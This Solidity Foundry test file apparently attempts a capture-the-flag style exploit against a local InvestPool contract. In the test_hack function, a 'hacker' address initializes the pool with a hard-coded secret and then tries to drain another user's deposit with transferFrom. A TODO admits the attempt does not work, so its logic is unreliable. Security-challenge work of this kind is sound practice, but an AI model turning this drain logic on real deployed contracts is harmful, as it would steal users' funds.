// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/PoolToken.sol";
import "../src/InvestPool.sol";

//TODO: Still not working, idk why

contract Hack is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.startPrank(user);
        pool.deposit(amount);
        vm.stopPrank();
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
		vm.startPrank(hacker);

        // solution
        //First we initialize the pool
        pool.initialize("j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx");
        //pool.deposit(1000);
        vm.stopPrank();

        //Now we wait until a user deposits his money    
        userDeposit(1000);

        vm.startPrank(hacker);
        //Now we first transfer the users shares to us and then withdraw all the money from the pool
        //pool.transferFromShare(1000, user);
        //pool.withdrawAll();
        token.transferFrom(address(pool), hacker, 1000);

		vm.stopPrank();
        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}